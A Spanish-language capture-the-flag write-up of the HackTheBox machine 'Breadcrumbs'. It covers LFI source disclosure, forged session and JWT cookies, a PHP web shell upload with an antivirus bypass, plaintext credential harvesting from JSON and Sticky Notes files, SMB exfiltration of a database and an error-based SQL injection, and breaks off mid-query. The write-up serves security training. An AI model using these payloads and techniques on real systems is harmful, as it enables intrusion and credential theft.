---
layout: post
title: Breadcrumbs
date: 2023-01-27
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Breadcrumbs-htb/Breadcrumbs_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de No Redirect

* Mass assignment (Fallido)

* Análisis de código en PHP

* LFI

* Cookie Hijacking (PHPSESSID)

* Cookie HIjacking (JWT)

* Bypass Restrictiones en WebShell PHP

* Reverse Shell con Nishang y netcat (Fallido)

* Extracción de credenciales de archivo JSON

* Abuso de Sticky Notes

* SQL Inyection (Error Based)

* Criptografía (AES)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.228 -sS -vvv -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 13:09 GMT
Initiating SYN Stealth Scan at 13:09
Scanning 10.10.10.228 [65535 ports]
Discovered open port 139/tcp on 10.10.10.228
Discovered open port 443/tcp on 10.10.10.228
Discovered open port 445/tcp on 10.10.10.228
Discovered open port 22/tcp on 10.10.10.228
Discovered open port 135/tcp on 10.10.10.228
Discovered open port 80/tcp on 10.10.10.228
Discovered open port 3306/tcp on 10.10.10.228
Discovered open port 49665/tcp on 10.10.10.228
Discovered open port 7680/tcp on 10.10.10.228
Discovered open port 49664/tcp on 10.10.10.228
Discovered open port 49669/tcp on 10.10.10.228
Completed SYN Stealth Scan at 13:09, 48.88s elapsed (65535 total ports)
Nmap scan report for 10.10.10.228
Host is up, received user-set (0.59s latency).
Scanned at 2023-01-27 13:09:08 GMT for 49s
Not shown: 37300 filtered tcp ports (no-response), 28224 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
3306/tcp  open  mysql        syn-ack ttl 127
7680/tcp  open  pando-pub    syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.97 seconds
           Raw packets sent: 227685 (10.018MB) | Rcvd: 33966 (1.359MB)
```

### Servicios y versiones

```null
nmap -sCV -p22,80,135,139,443,445,3306,7680,49664,49665,49669 10.10.10.228 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 13:11 GMT
Nmap scan report for 10.10.10.228
Host is up (0.46s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9dd0b8815554ea0f89b11032336aa78f (RSA)
|   256 1f2e67371ab8911d5c3159c7c6df141d (ECDSA)
|_  256 309e5d12e3c6b7c63b7e1ee7897e83e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Library
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, Kerberos, LDAPSearchReq, LPDString, SMBProgNeg, TerminalServerCookie, X11Probe: 
|_    Host '10.10.16.8' is not allowed to connect to this MariaDB server
7680/tcp  open  pando-pub?
49664/tcp open  unknown
49665/tcp open  unknown
49669/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=1/27%Time=63D3CD7E%P=x86_64-pc-linux-gnu%r(DN
SF:SVersionBindReqTCP,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.8'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(TerminalServerCookie,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.8'\x
SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser
SF:ver")%r(Kerberos,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.8'\x20is\x2
SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r
SF:(SMBProgNeg,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.8'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11P
SF:robe,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.8'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDString,4
SF:9,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.8'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq,49,
SF:"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.8'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-27T13:11:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.88 seconds
```

## Puerto 445 (SMB)

Con crackmapexec, aplico un escaneo para ver la versiones, hostname y dominio

```null
crackmapexec smb 10.10.10.228
SMB         10.10.10.228    445    BREADCRUMBS      [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False)
```

No puedo listar recursos compartidos sin disponer de credenciales

```null
smbmap -H 10.10.10.228 -u 'null'

[!] Authentication error on 10.10.10.228

```

## Puerto 80 (HTTP) | Puerto 443 (HTTPS)

Con whatweb analizo las tecnologías que se están empleando

```null
whatweb http://10.10.10.228
http://10.10.10.228 [200 OK] Apache[2.4.46], Bootstrap[4.0.0], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1], IP[10.10.10.228], JQuery[3.2.1], OpenSSL[1.1.1h], PHP[8.0.1], Script[text/javascript], Title[Library], X-Powered-By[PHP/8.0.1], X-UA-Compatible[IE=edge]
```

Y por https hay lo mismo

```null
whatweb https://10.10.10.228
https://10.10.10.228 [200 OK] Apache[2.4.46], Bootstrap[4.0.0], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1], IP[10.10.10.228], JQuery[3.2.1], OpenSSL[1.1.1h], PHP[8.0.1], Script[text/javascript], Title[Library], X-Powered-By[PHP/8.0.1], X-UA-Compatible[IE=edge]
```

Con openssl, inspecciono el certificado SSL, pero no encuentro ningún hostname nuevo

```null
openssl s_client -connect 10.10.10.228:443 | grep CN
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=Nov  8 23:48:47 2019 GMT
verify return:1
depth=0 CN = localhost
notAfter=Nov  8 23:48:47 2019 GMT
verify return:1
 0 s:CN = localhost
   i:CN = localhost
subject=CN = localhost
issuer=CN = localhost
```

Al abrir la página web del puerto 80 en el navegador, se puede ver el siguiente contenido:

<img src="/writeups/assets/img/Breadcrumbs-htb/1.png" alt="">

Si hago clic en Check Books, me redirige a un formulario

<img src="/writeups/assets/img/Breadcrumbs-htb/2.png" alt="">

Intercepto la petición con BurpSuite para hacer pruebas. Enviando cualquier dato no encuentra nada, pero si introduzco una comilla la cosa cambia

<img src="/writeups/assets/img/Breadcrumbs-htb/3.png" alt=""> <img src="/writeups/assets/img/Breadcrumbs-htb/4.png" alt="">

Más que tratarse de una inyección SQL, está aplicando filtros en función de los caracteres del título. Si introduzco un espacio, podré ver el resto de libros en la respuesta.

<img src="/writeups/assets/img/Breadcrumbs-htb/5.png" alt="">

Si trato de guardarlo, el servicio no está disponible

<img src="/writeups/assets/img/Breadcrumbs-htb/6.png" alt="">

Inspecciono de donde está extrayendo esa información

<img src="/writeups/assets/img/Breadcrumbs-htb/7.png" alt="">

Esta función la llama de un archivo en javascript

<img src="/writeups/assets/img/Breadcrumbs-htb/8.png" alt="">

Y encuentro la función

```nullscript
function getInfo(e){
    const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            book: bookId,
            method: 1,
        },
        dataType: "json",
        success: function(res){
            $("#about").html(res);
        }
    });
}
```

A la hora de almacenar los libros, se está utilizando un patrón que, en caso de conocer todos los parámetros, podría tratar de listar su contenido.
El directorio includes tiene capacidad de directory listing

<img src="/writeups/assets/img/Breadcrumbs-htb/9.png" alt="">

A la hora de tramitar la data por POST, el método utilizado es 1. Sin embargo, cuando intercepté la petición con BurpSuite, vi que por defecto está en 0. Si lo cambió y envió, recibo un error

<img src="/writeups/assets/img/Breadcrumbs-htb/10.png" alt="">

Mediante la función file_get_contents() de PHP, está tratando de obtener un archivo. Yo le he enviado un espacio, por lo que tiene sentido que ese archivo no existe. Como está haciendo un path traversal y actualmente estoy en el directorio PHP, quiero pensar que el directorio books cuelga de la raíz y que en caso de que tenga capacidad de directory listing podré ver todos los recursos. a pesar de ello, este campo no es vulnerable a LFI.

<img src="/writeups/assets/img/Breadcrumbs-htb/11.png" alt="">

Esto no sirve de nada porque este contenido es el mismo que veía al intentar hacer la reserva. Hago fuzzing para encontrar otros directorios alternativos

```null
gobuster dir -u http://10.10.10.228 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.228
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/27 14:00:41 Starting gobuster in directory enumeration mode
===============================================================
/books                (Status: 301) [Size: 336] [--> http://10.10.10.228/books/]
/php                  (Status: 301) [Size: 334] [--> http://10.10.10.228/php/]
/portal               (Status: 301) [Size: 337] [--> http://10.10.10.228/portal/]
/css                  (Status: 301) [Size: 334] [--> http://10.10.10.228/css/]
/includes             (Status: 301) [Size: 339] [--> http://10.10.10.228/includes/]
/db                   (Status: 301) [Size: 333] [--> http://10.10.10.228/db/]
/js                   (Status: 301) [Size: 333] [--> http://10.10.10.228/js/]
/Books                (Status: 301) [Size: 336] [--> http://10.10.10.228/Books/]
```

Abro el directorio /portal desde el navegador y me aparece un panel de inicio de sesión, pero también una advertencia que indica que mi IP está restringida

<img src="/writeups/assets/img/Breadcrumbs-htb/12.png" alt="">

Pruebo a registrarme como el usuario admin, para validar si existe o no

<img src="/writeups/assets/img/Breadcrumbs-htb/13.png" alt="">

Y no me sale ningún error. Si trato de volver a realizar el mismo procedimiento, entonces si aparece un error diciendo que existe

<img src="/writeups/assets/img/Breadcrumbs-htb/14.png" alt="">

Puedo iniciar sesión, pero no estoy asignado a ningún role, por lo que imagino que no tengo ningún privilegio especial

<img src="/writeups/assets/img/Breadcrumbs-htb/15.png" alt="">

Al hacer click en Check tasks, me aparece una tabla con pistas del propio CTF

<img src="/writeups/assets/img/Breadcrumbs-htb/16.png" alt="">

Como tarea urgente, está arreglar el botón de cerrar sesión. Como en mantenimiento pone que las cookies de sesión tienen una duración infinita, en caso de que consiga una válida para un usuario Administrador, me podré convertir en él.

Estoy arrastrando dos cookies de sesión, un PHPSESSID y un JWT

<img src="/writeups/assets/img/Breadcrumbs-htb/17.png" alt="">

Si le aplico un decoder, puedo ver los campos que lo forman

<img src="/writeups/assets/img/Breadcrumbs-htb/18.png" alt="">

Aparace una sesión con los usuarios de la web y con el role que tienen asignado

<img src="/writeups/assets/img/Breadcrumbs-htb/19.png" alt="">

El directorio donde están todos estos recursos tiene capacidad de directory listing

<img src="/writeups/assets/img/Breadcrumbs-htb/20.png" alt="">

Si abro el archivo admins.php, puedo que usuarios están activos

<img src="/writeups/assets/img/Breadcrumbs-htb/21.png" alt="">

Por el contrario files.php aplica un redirect a /portal/index.php. En caso de que pueda ver el output antes de que cargue la nueva ruta, se estaría filtrando información que podría tratar de aprovechar. Con BurpSuite, intercepto la petición y capturo la respuesta

<img src="/writeups/assets/img/Breadcrumbs-htb/22.png" alt="">

<img src="/writeups/assets/img/Breadcrumbs-htb/23.png" alt="">

Efectivamente, puedo ver el contenido y si cambio el código de estado 302 por un 200 y borro la cabecera Location, si le hago un forward, puedo ver en el navegador el código HTML interpretado

<img src="/writeups/assets/img/Breadcrumbs-htb/24.png" alt="">

Para automitar el que no aplique el redirect, desde las opciones de BurpSuite, en Match and Replace, indico que cambie la cabecera del código de estado 302 por un 200

<img src="/writeups/assets/img/Breadcrumbs-htb/25.png" alt="">

Pruebo a subir un archivo en PHP que me permita ejecutar comandos

```null
<?php
  system($_REQUEST['cmd']);
?>
```

Pero no tengo suficientes permisos

<img src="/writeups/assets/img/Breadcrumbs-htb/26.png" alt="">

Intercepto la petición, pero no veo ningún paramétro que pueda cambiar para efectuar un mass asignement attack y burlar las restricciones

<img src="/writeups/assets/img/Breadcrumbs-htb/27.png" alt="">

A la hora de realizar la reserva de los libros, el contenido del archivo lo podía ver reflejado en la respuesta. Podría tratar de interceptar la petición y apuntar a otra ruta.

<img src="/writeups/assets/img/Breadcrumbs-htb/28.png" alt="">

<img src="/writeups/assets/img/Breadcrumbs-htb/29.png" alt="">

De antes había visto un archivo bookControler.php, si trato de apuntar a este, puede ver su contenido en texto claro.

<img src="/writeups/assets/img/Breadcrumbs-htb/30.png" alt="">

Lo copio a un archivo y transformo los \r y \n en retornos de carro y saltos de línea

<img src="/writeups/assets/img/Breadcrumbs-htb/31.png" alt="">

El archivo está importando el fichero db.php

```null
require '../db/db.php';
```

Hay credenciales en texto claro

```null
$user="bread";
$password="jUli901";
```

Como son credenciales de acceso a la base de datos y el puerto 3306 está abierto, me conecto y enumero información

Pero mi IP no tiene acceso

```null
mysql -ubread -p -h 10.10.10.228
Enter password: 
ERROR 1130 (HY000): Host '10.10.16.8' is not allowed to connect to this MariaDB server
```

Como toda la parte de las cookies de sesión estaba en la ruta /Portal, aplico fuzzing desde ese directorio

```null
gobuster dir -u http://10.10.10.228/portal -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.228/portal
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/27 15:18:29 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 345] [--> http://10.10.10.228/portal/uploads/]
/assets               (Status: 301) [Size: 344] [--> http://10.10.10.228/portal/assets/]
/php                  (Status: 301) [Size: 341] [--> http://10.10.10.228/portal/php/]
/includes             (Status: 301) [Size: 346] [--> http://10.10.10.228/portal/includes/]
/db                   (Status: 301) [Size: 340] [--> http://10.10.10.228/portal/db/]
```

Encuentra un directorio /uploads que podría servirme en caso de que logre subir algún archivo

<img src="/writeups/assets/img/Breadcrumbs-htb/32.png" alt="">

Si fuzzeo en portal pero por extensiones PHP, llego a un archivo sospechoso

```null
gobuster dir -u http://10.10.10.228/portal -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.228/portal
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/27 15:25:03 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 2507]
/uploads              (Status: 301) [Size: 345] [--> http://10.10.10.228/portal/uploads/]
/signup.php           (Status: 200) [Size: 2734]
/assets               (Status: 301) [Size: 344] [--> http://10.10.10.228/portal/assets/]
/php                  (Status: 301) [Size: 341] [--> http://10.10.10.228/portal/php/]
/includes             (Status: 301) [Size: 346] [--> http://10.10.10.228/portal/includes/]
/Index.php            (Status: 302) [Size: 0] [--> login.php]
/Login.php            (Status: 200) [Size: 2507]
/db                   (Status: 301) [Size: 340] [--> http://10.10.10.228/portal/db/]
/logout.php           (Status: 302) [Size: 12] [--> login.php]
/vendor               (Status: 301) [Size: 344] [--> http://10.10.10.228/portal/vendor/]
/cookie.php           (Status: 200) [Size: 0]
```

Desde el LFI, me traigo el contenido del archivo y lo copio a mi equipo local. Tiene una función que crea la cookie de sesión. Está tomando una cadena qu aparece hardcodeada, el nombre del usuario y un valor aleatorio entre 0 y la longitud del nombre del usuario menos una unidad

```null
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528.9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```

Para poder ver el resutlado, le añado al script una sentencia que se encargue de imprimir la cookie para un usuario dado. Como el usuario Paul estaba activo y era administrador, trataré de computar su cookie de sesión.

```null
print(makesession("paul"))
```

Ejecuto el script 2000 veces y muestro cadenas únicas para que no haya repeticiones

```null
for i in $(seq 1 2000); do php cookie.php; echo; done | sort -u
paul47200b180ccd6835d25d034eeb6e6390
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paula2a6a014d3bee04d7df8d5837d62e8c5
```

Las almaceno en un diccionario y con wfuzz pruebo a autenticarme con todas para ver cual es válida

```null
wfuzz -c -w /home/rubbx/Desktop/HTB/Machines/Breadcumbs/dictionary.txt -H "Cookie: PHPSESSID=FUZZ" http://10.10.10.228/portal/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.228/portal/
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000001:   200        58 L     184 W      3536 Ch     "paul47200b180ccd6835d25d034eeb6e6390"                                                                                                          
000000003:   302        0 L      0 W        0 Ch        "paul8c8808867b53c49777fe5559164708c3"                                                                                                          
000000002:   302        0 L      0 W        0 Ch        "paul61ff9d4aaefe6bdf45681678ba89ff9d"                                                                                                          
000000004:   302        0 L      0 W        0 Ch        "paula2a6a014d3bee04d7df8d5837d62e8c5"
```

Aquella que me devuelve contenido es la válida, pero es probable que necesite el JWT de paul también para poder convertirme en él. Hago un cookie hijacking y cambio mi cookie de sesión por la suya

<img src="/writeups/assets/img/Breadcrumbs-htb/33.png" alt="">

Ya estoy loggeado como este usuario

<img src="/writeups/assets/img/Breadcrumbs-htb/34.png" alt="">

Si trato de subir de nuevo un archivo, me sigue poniendo que no tengo privilegios, por lo que también voy a necesitar encontrar la forma de obtener su JWT. En la ruta /portal/includes, había visto un fileController.php, así que desde el LFI me lo traigo y veo su contenido.

Se ve hardcodeado el secreto para crear un JWT

```null
$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
```

Desde la web jwt.io, computo esta nueva cookie tomando como referencia la mía e introduciendo la firma que corresponde al secreto

<img src="/writeups/assets/img/Breadcrumbs-htb/35.png" alt="">

Vuelvo a aplicar el cookie hijacking pero con esta otra cookie y ahora ya puedo subir archivos a la máquina, pero recibo un error

<img src="/writeups/assets/img/Breadcrumbs-htb/36.png" alt="">

Lo más probable es que el Windows Defender lo esté detectando como malicioso y borrandólo. Si lo intercepto con BurpSuite

Donde aplica el append para concatenarle el .zip, se lo cambio por test.php y en vez de utilizar system() para ejecutar comandos, utilizo shell_exec()

<img src="/writeups/assets/img/Breadcrumbs-htb/37.png" alt="">

Y obtengo ejecución remota de comandos

```null
curl -s -X GET "http://10.10.10.228/portal/uploads/test.php?cmd=whoami"
breadcrumbs\www-data
```

No puedo entablarme una reverse shell con netcat o Invoke-PowerShellTcp.ps1, no puedo ya que hay reglas de firewall implementadas. Como la versión de PHP es superior a la 5.3.0, no puedo utilizar herramientas como regorg para montarme un tunel.

Si no pongo ningún comando, aparece un error que leakea una ruta

<img src="/writeups/assets/img/Breadcrumbs-htb/38.png" alt="">

Encuentro un directorio extraño, pizzaDeliveryUserData

```null
Directory of C:\Users\www-data\Desktop\xampp\htdocs\portal

02/08/2021  05:37 AM    <DIR>          .
02/08/2021  05:37 AM    <DIR>          ..
02/08/2021  05:37 AM    <DIR>          assets
02/01/2021  10:40 PM             3,956 authController.php
02/01/2021  09:40 PM               114 composer.json
11/28/2020  12:55 AM             6,140 composer.lock
12/09/2020  03:30 PM               534 cookie.php
02/08/2021  05:37 AM    <DIR>          db
02/08/2021  05:37 AM    <DIR>          includes
02/01/2021  06:59 AM             3,757 index.php
02/01/2021  01:57 AM             2,707 login.php
01/16/2021  01:47 PM               694 logout.php
02/08/2021  05:37 AM    <DIR>          php
02/08/2021  05:37 AM    <DIR>          pizzaDeliveryUserData
02/01/2021  01:58 AM             2,934 signup.php
01/27/2023  08:55 AM    <DIR>          uploads
02/08/2021  05:37 AM    <DIR>          vendor
               8 File(s)         20,836 bytes
               9 Dir(s)   6,542,012,416 bytes free
```

Si listo lo que hay dentro de él, veo un archivo en JSON

```null
Directory of C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData

02/08/2021  05:37 AM    <DIR>          .
02/08/2021  05:37 AM    <DIR>          ..
11/28/2020  01:48 AM               170 alex.disabled
11/28/2020  01:48 AM               170 emma.disabled
11/28/2020  01:48 AM               170 jack.disabled
11/28/2020  01:48 AM               170 john.disabled
01/17/2021  03:11 PM               192 juliette.json
11/28/2020  01:48 AM               170 lucas.disabled
11/28/2020  01:48 AM               170 olivia.disabled
11/28/2020  01:48 AM               170 paul.disabled
11/28/2020  01:48 AM               170 sirine.disabled
11/28/2020  01:48 AM               170 william.disabled
              10 File(s)          1,722 bytes
               2 Dir(s)   6,541,996,032 bytes free
```

Al abrirlo, se pueden ver contraseñas en texto claro

```nullon
{
	"pizza" : "margherita",
	"size" : "large",	
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}
```

Valido las credenciales por SSH

```null
crackmapexec ssh 10.10.10.228 -u 'juliette' -p 'jUli901./())!'
SSH         10.10.10.228    22     10.10.10.228     [*] SSH-2.0-OpenSSH_for_Windows_7.7
SSH         10.10.10.228    22     10.10.10.228     [+] juliette:jUli901./())! 
```

Gano acceso al sistema y puedo visualizar la primera flag

```null
ssh juliette@10.10.10.228
juliette@10.10.10.228's password: 

Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

juliette@BREADCRUMBS C:\Users\juliette>

juliette@BREADCRUMBS C:\Users\juliette\Desktop>type user.txt
5100259cf3bf6a34b787280c3e086d8d
```

Dentro del escritorio hay un archivo todo.html

```null
Task                            Status      Reason
Configure firewall for port 22  Not started Unauthorized access might be
and 445                                     possible
Migrate passwords from the
Microsoft Store Sticky Notes    In progress It stores passwords in plain text
application to our new password
manager
Add new features to password    Not started To get promoted, hopefully lol
manager
```

Hay contraseñas almacenadas en los Sticky Notes. Me dirijo a la ruta donde se almacenan para este usuario, pero no existe

```null
PS C:\Users\juliette\AppData\Roaming\Microsoft> dir -force


    Directory: C:\Users\juliette\AppData\Roaming\Microsoft


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         1/15/2021   3:59 PM                Credentials
d---s-         1/15/2021   3:59 PM                Crypto
d-----         1/15/2021   4:00 PM                Internet Explorer
d-----         1/15/2021   4:00 PM                Network
d---s-         1/15/2021   3:59 PM                Protect
d-----          3/2/2021   1:31 PM                Spelling
d---s-         1/15/2021   4:00 PM                SystemCertificates
d-----         1/15/2021   3:59 PM                Vault
d-----          2/1/2021   3:58 AM                Windows
```

Aunque también hay otra donde se almacenan los backups

```null
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> dir


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal
```

Me transfiero el archivo SQLite, a través de un recurso compartido por SMB

De mi lado creo el servidor

```null
smbserver.py shared $(pwd) -smb2support
```

Desde la máquina víctima copio

```null
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> copy .\plum.sqlite-wal \\10.10.16.8\Shared\plum.plum.sqlite-wal
```

Al hacerle un strings, se pueden ver credenciales en texto claro

```null
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
```

Me conecto como este nuevo usuario

```null
ssh development@10.10.10.228
development@10.10.10.228's password:

Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

development@BREADCRUMBS C:\Users\development>       

```

En la raíz hay un directorio Development, al que ahora tengo acceso

```null
development@BREADCRUMBS C:\Development>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Development

01/15/2021  04:03 PM    <DIR>          .
01/15/2021  04:03 PM    <DIR>          ..
11/29/2020  03:11 AM            18,312 Krypter_Linux
               1 File(s)         18,312 bytes
               2 Dir(s)   6,535,151,616 bytes free
```

Me lo transfiero a mi equipo y miro que tipo de archivo es

```null
file Krypter_Linux
Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
```

Mostrando las cadenas de caracteres imprimibles, se puede ver una URL

```null
strings Krypter_Linux
Account: Administrator
http://passmanager.htb:1234/index.php
method=select&username=administrator&table=passwords
```

Ese puerto está abierto en la máquina víctima

```null
netstat -nat
TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING       InHost
```

Si le hago un curl, me reporta un error

```null
PS C:\Development> cmd /c curl 127.0.0.1:1234
Bad Request
```

Le añado el método que se filtraba por GET

```null
development@BREADCRUMBS C:\Development>curl "localhost:1234/index.php?method=select&username=administrator&table=passwords" 
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```

Se puede ver una key de AES, para desencriptar algo que desconozco, aunque como por GET le he pasado un sentencia SQL, puede que sea para una base de datos. Me voy a CyberChef para ver que valores le tengo que proporcionar

<img src="/writeups/assets/img/Breadcrumbs-htb/38.png" alt="">

Si introduzco una comilla me devuelve un error

```null
development@BREADCRUMBS C:\Development>curl "localhost:1234/index.php?method=select&username=administrator'&table=passwords"   
select<br />
<b>Fatal error</b>:  Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php:18
Stack trace:
#0 C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php(18): mysqli_fetch_all(false, 1)
#1 {main}
  thrown in <b>C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php</b> on line <b>18</b><br />
```

Traigo el puerto a mi equipo aplicando un local port forwarding por SSH para trabajar mejor desde el navegador web y no tener que url-encodear a mano todas las querys

```null
ssh> -L 1234:127.0.0.1:1234
Forwarding port.
```

Aplico un ordenamiento de la primera columna, y obtengo un campo donde puedo dumpear datos

```null
view-source:http://localhost:1234/index.php?method=select&username=administrator'union select 1-- -&table=passwords

selectarray(2) {
  [0]=>
  array(1) {
